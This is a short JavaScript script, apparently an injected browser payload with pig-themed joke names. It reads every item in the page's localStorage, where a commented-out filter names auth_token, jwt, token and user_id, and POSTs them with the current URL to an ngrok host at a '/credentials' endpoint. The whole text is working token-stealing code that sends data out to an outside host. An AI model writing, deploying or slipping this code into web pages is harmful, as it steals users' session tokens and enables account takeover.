(() => {
  console.hog = (...args) => console.log("🐷🐷🐷", args, "🐷🐷🐷")

  // const coolKeys = ["auth_token", "jwt", "token", "user_id"]

  const hogYourData = Object.keys(localStorage)
    // .filter(key => coolKeys.includes(key))
    .reduce((data, key) => {
      data[key] = localStorage.getItem(key)
      return data
    }, {})

  fetch("http://6fb1a90f.ngrok.io/credentials", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ url: window.location.href, tokens: hogYourData })
  })
})()
